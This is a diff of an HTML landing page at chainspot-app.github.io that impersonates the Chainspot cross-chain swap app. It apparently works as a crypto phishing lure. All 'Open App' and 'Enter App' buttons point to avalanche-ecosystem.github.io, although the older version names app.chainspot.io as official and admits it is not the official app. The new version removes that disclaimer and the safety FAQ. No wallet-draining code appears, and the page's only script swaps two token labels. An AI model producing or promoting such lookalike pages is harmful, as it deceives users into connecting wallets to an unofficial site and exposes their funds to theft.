@@ -1,47 +1,118 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Chainspot - Open App</title><meta name="description" content="chainspot routes wallets to cross-chain swaps, bridge paths, and DeFi access across EVM and non-EVM networks. Open the official app.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://chainspot-app.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Chainspot - Open App"><meta property="og:description" content="chainspot routes wallets to cross-chain swaps, bridge paths, and DeFi access across EVM and non-EVM networks. Open the official app.">
-<meta property="og:url" content="https://chainspot-app.github.io/"><meta property="og:image" content="https://chainspot-app.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Chainspot - Open App"><meta name="twitter:description" content="chainspot routes wallets to cross-chain swaps, bridge paths, and DeFi access across EVM and non-EVM networks. Open the official app."><meta name="twitter:image" content="https://chainspot-app.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://chainspot-app.github.io/#website", "url": "https://chainspot-app.github.io/", "name": "Chainspot"}, {"@type": "WebPage", "@id": "https://chainspot-app.github.io/#webpage", "url": "https://chainspot-app.github.io/", "name": "Chainspot - Open App", "description": "chainspot routes wallets to cross-chain swaps, bridge paths, and DeFi access across EVM and non-EVM networks. Open the official app.", "inLanguage": "en", "isPartOf": {"@id": "https://chainspot-app.github.io/#website"}}, {"@type": "Organization", "@id": "https://chainspot-app.github.io/#org", "name": "Chainspot", "url": "https://chainspot-app.github.io/", "logo": "https://chainspot-app.github.io/og-cover.png", "sameAs": ["https://twitter.com/chainspotIO", "https://chainspot.io/", "https://docs.chainspot.io/"]}, {"@type": "WebApplication", "@id": "https://chainspot-app.github.io/#app", "name": "Chainspot", "url": "https://chainspot-app.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "chainspot routes wallets to cross-chain swaps, bridge paths, and DeFi access across EVM and non-EVM networks. Open the official app.", "featureList": ["Official dApp", "Non-custodial", "EVM + non-EVM"], "isPartOf": {"@id": "https://chainspot-app.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://chainspot-app.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is Chainspot used for?", "acceptedAnswer": {"@type": "Answer", "text": "Chainspot is used to find cross-chain swap and bridge routes across supported EVM and non-EVM networks. Instead of manually checking several bridges and DEXes, users enter a source asset, destination asset and network pair, then review the route produced by the app. It is most useful when the desired trade crosses chains or requires a routed path rather than a simple same-chain swap."}}, {"@type": "Question", "name": "Does Chainspot have its own token?", "acceptedAnswer": {"@type": "Answer", "text": "Chainspot is primarily searched as a routing app and documentation hub, not as a widely listed liquid token page. If a site or message asks you to buy a Chainspot token, verify it against Chainspot's official website, docs and social accounts first. Do not rely on a contract address from ads, replies, direct messages or search snippets."}}, {"@type": "Question", "name": "Which wallet can I connect to Chainspot?", "acceptedAnswer": {"@type": "Answer", "text": "Chainspot is a Web3 app, so wallet support depends on the live interface and the network selected for the route. For EVM chains, users generally need an EVM-compatible wallet; for non-EVM routes, the app may require a different wallet path or WalletConnect-compatible flow. Always confirm the active wallet address and destination recipient before signing."}}, {"@type": "Question", "name": "How long does a Chainspot bridge transaction take?", "acceptedAnswer": {"@type": "Answer", "text": "Chainspot transaction time depends on the chosen route, source chain confirmation time, destination chain conditions and the underlying bridge or liquidity provider. A same-token route between high-throughput chains may settle faster than a route involving swaps on both sides. Use the live app status and explorers rather than assuming a fixed completion time."}}, {"@type": "Question", "name": "Can Chainspot bridge from BNB Chain to Polygon?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, BNB Chain to Polygon is the kind of cross-chain route Chainspot is designed to quote, and the sample widget in this page uses USDT on BNB Chain to MATIC on Polygon. Availability still depends on current liquidity, token support and route providers in the live app, so check the exact output before approving."}}, {"@type": "Question", "name": "What should I check before signing a Chainspot route?", "acceptedAnswer": {"@type": "Answer", "text": "Check the official app domain, connected wallet, source network, destination network, source token, output token, recipient address, estimated output, minimum received amount, slippage and any token approval request. For cross-chain swaps, also look at the underlying bridge or router name and recovery path. Those details determine practical risk more than the headline quote alone."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Chainspot"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Chainspot</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Chainspot</h1>
-      <div class="bridge-widget" role="group" aria-label="Chainspot preview"><div class="bw-field"><span class="bw-coin"><img src="static/usdt.png" alt="USDT" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>USDT</b> · BNB Chain</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/matic.png" alt="MATIC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>MATIC</b> · Polygon</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-bnb.png" alt="BNB Chain" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Chainspot ↗</a></div>
-      <p class="hero-note">Live preview — open the official Chainspot app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official dApp</span><span class="trust-chip">Non-custodial</span><span class="trust-chip">EVM + non-EVM</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Chainspot?</h2><div class="capsule"><strong>Chainspot</strong> is a non-custodian omnichain DeFi protocol for managing DeFi positions across <a class="inline-link" href="https://docs.chainspot.io/overview/welcome-to-chainspot" rel="noopener noreferrer">EVM and non-EVM networks</a>, as described in its <a href="https://docs.chainspot.io/">official documentation</a>. The app focuses on <a class="inline-link" href="https://ethereum.org/en/developers/docs/bridges/" rel="noopener noreferrer">cross-chain swaps</a>, bridging, and routing through integrated liquidity providers.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Chainspot at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Omnichain bridge and <a class="inline-link" href="https://uniswap.org/blog/auto-router" rel="noopener noreferrer">swap router</a></b></div><div class="f"><small>Network</small><b>EVM and non-EVM chains</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/n/noncustodial-wallets.asp" rel="noopener noreferrer">Non-custodial</a></b></div><div class="f"><small>Official app</small><b>app.chainspot.io</b></div><div class="f"><small>Documentation</small><b>docs.chainspot.io</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Chainspot supported chains and tokens</h2><div class="intent-a">Chainspot is searched most often as a cross-chain routing app, so supported networks matter more than a single pool or chain. The official site describes Chainspot as an omnichain protocol for EVM and non-EVM chains, and its ecosystem materials list major networks such as Ethereum, <a class="inline-link" href="https://www.binance.com/en/blog/ecosystem/what-is-bnb-chain-421499824684903934" rel="noopener noreferrer">BNB Chain</a>, Polygon, <a class="inline-link" href="https://l2beat.com/scaling/projects/arbitrum" rel="noopener noreferrer">Arbitrum</a>, <a class="inline-link" href="https://www.coingecko.com/en/coins/avalanche" rel="noopener noreferrer">Avalanche</a>, Tron and TON. Token availability is route-dependent: the app combines bridge and DEX liquidity, so a token may be available on one source and destination pair but not another. Before signing, use the live quote screen to confirm the source chain, destination chain, token contract, estimated output, route provider and destination wallet.</div></div></section><section class="section"><div class="container"><h2>Chainspot bridge fees and routing costs</h2><div class="intent-a">Chainspot does not have one universal bridge fee shown as a fixed percentage for every route. The cost of a Chainspot route can include source-chain gas, destination execution costs, <a class="inline-link" href="https://coinmarketcap.com/academy/glossary/slippage" rel="noopener noreferrer">slippage</a>, bridge or DEX provider fees, and any routing spread shown in the quote. The official docs include a fees section and position Chainspot as a <a class="inline-link" href="https://docs.chainspot.io/architecture/liquidity-routing" rel="noopener noreferrer">liquidity-routing layer</a> rather than a custodial bridge. The practical way to compare costs is to quote the same token pair and networks in Chainspot and at least one direct bridge, then compare received amount, gas token requirements, arrival chain and route components before approving.</div></div></section><section class="section section-alt"><div class="container"><h2>How to use Chainspot for cross-chain swaps</h2><div class="intent-a">To use Chainspot, open <a href="https://app.chainspot.io/">the official Chainspot app</a>, connect the wallet you control, choose the source network, source token, destination network, destination token and amount, then review the generated route. Chainspot is built for cross-chain swaps and bridge paths, so the quote can involve multiple liquidity providers. Check the recipient address, minimum received amount, slippage, gas requirements and <a class="inline-link" href="https://www.gemini.com/cryptopedia/what-is-a-token-contract" rel="noopener noreferrer">token contracts</a>. If an approval is required, approve only the token and amount you intend to use. After signing, monitor the route in the app or the relevant chain explorers.</div></div></section><section class="section"><div class="container"><h2>Chainspot security and audits</h2><div class="intent-a">Chainspot describes itself as non-custodial, with users signing transactions from their own wallets and <a class="inline-link" href="https://www.ibm.com/topics/smart-contracts" rel="noopener noreferrer">smart contracts</a> handling routing rather than permanent fund custody. Its security documentation says the protocol has audit coverage from HashEx and DeCurity and separates on-chain contracts from off-chain aggregation modules. That does not remove route risk: users still need to verify the domain, <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-a-token-approval" rel="noopener noreferrer">token approvals</a>, destination address, bridge provider and transaction details. For larger transactions, test with a small amount first and avoid granting broad token approvals when a smaller approval fits the intended swap.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Chainspot</h2><ol class="steps"><li><b>Open the official app</b><span>Use the app domain, confirm the URL, and start from the wallet connection screen.</span></li><li><b>Connect your wallet</b><span>Choose the wallet and network you want to send from before selecting the destination chain.</span></li><li><b>Build the route</b><span>Pick the token, source network, destination network, and amount so the router can show available paths.</span></li><li><b>Review and sign</b><span>Check output, slippage, fees, destination address, and route details before signing in your wallet.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official Chainspot app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Chainspot ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Chainspot vs other <a class="inline-link" href="https://messari.io/report/state-of-bridge-protocols" rel="noopener noreferrer">bridge aggregators</a></h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Chainspot</th><th>Alternative bridge aggregator</th></tr></thead><tbody><tr><td>Primary use</td><td>Cross-chain swaps, bridge routes and DeFi routing</td><td>Usually bridge and swap route comparison</td></tr><tr><td>Network scope</td><td>EVM and selected non-EVM networks</td><td>Depends on the provider and integrations</td></tr><tr><td>Custody model</td><td>Wallet-signed, <a class="inline-link" href="https://www.britannica.com/money/non-custodial-wallet" rel="noopener noreferrer">non-custodial</a> routing</td><td>Usually non-custodial, but route mechanics vary</td></tr><tr><td>Best comparison metric</td><td>Net received amount plus route and recovery details</td><td>Net received amount, speed and provider risk</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Chainspot FAQ</h2><div class="faq-list"><details open><summary><h3>What is Chainspot used for?</h3></summary><div>Chainspot is used to find cross-chain swap and bridge routes across supported EVM and non-EVM networks. Instead of manually checking several bridges and DEXes, users enter a source asset, destination asset and network pair, then review the route produced by the app. It is most useful when the desired trade crosses chains or requires a routed path rather than a simple same-chain swap.</div></details><details><summary><h3>Does Chainspot have its own token?</h3></summary><div>Chainspot is primarily searched as a routing app and documentation hub, not as a widely listed liquid token page. If a site or message asks you to buy a Chainspot token, verify it against Chainspot's official website, docs and social accounts first. Do not rely on a contract address from ads, replies, direct messages or search snippets.</div></details><details><summary><h3>Which wallet can I connect to Chainspot?</h3></summary><div>Chainspot is a Web3 app, so wallet support depends on the live interface and the network selected for the route. For EVM chains, users generally need an EVM-compatible wallet; for non-EVM routes, the app may require a different wallet path or <a class="inline-link" href="https://walletconnect.com/about" rel="noopener noreferrer">WalletConnect</a>-compatible flow. Always confirm the active wallet address and destination recipient before signing.</div></details><details><summary><h3>How long does a Chainspot bridge transaction take?</h3></summary><div>Chainspot transaction time depends on the chosen route, source chain confirmation time, destination chain conditions and the underlying bridge or liquidity provider. A same-token route between high-throughput chains may settle faster than a route involving swaps on both sides. Use the live app status and explorers rather than assuming a fixed completion time.</div></details><details><summary><h3>Can Chainspot bridge from BNB Chain to Polygon?</h3></summary><div>Yes, BNB Chain to Polygon is the kind of cross-chain route Chainspot is designed to quote, and the sample widget in this page uses USDT on BNB Chain to MATIC on Polygon. Availability still depends on current liquidity, token support and route providers in the live app, so check the exact output before approving.</div></details><details><summary><h3>What should I check before signing a Chainspot route?</h3></summary><div>Check the official app domain, connected wallet, source network, destination network, source token, output token, recipient address, estimated output, minimum received amount, slippage and any token approval request. For cross-chain swaps, also look at the underlying bridge or router name and recovery path. Those details determine practical risk more than the headline quote alone.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify app.chainspot.io before connecting a wallet. Educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chainspot</title>
+  <meta name="description" content="Chainspot finds and routes cross-chain swaps and bridges from your own wallet.">
+  <link rel="canonical" href="https://chainspot-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F6F5F2">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Chainspot">
+  <meta property="og:description" content="Chainspot finds and routes cross-chain swaps and bridges from your own wallet.">
+  <meta property="og:url" content="https://chainspot-app.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Chainspot">
+  <meta name="twitter:description" content="Chainspot finds and routes cross-chain swaps and bridges from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://chainspot-app.github.io/#website",
+        "url": "https://chainspot-app.github.io/",
+        "name": "Chainspot",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://chainspot-app.github.io/#organization",
+        "name": "Chainspot",
+        "url": "https://chainspot-app.github.io/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://chainspot-app.github.io/#app",
+        "name": "Chainspot",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://chainspot-app.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="Chainspot home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Chainspot</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
+      <a href="https://l2beat.com/" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Chainspot</h1>
+      <p class="sub"><strong>Chainspot</strong> finds and routes cross-chain swaps and bridges from your own wallet.</p>
+    </section>
+
+    <section class="card" aria-label="Cross-chain swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Chainspot &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
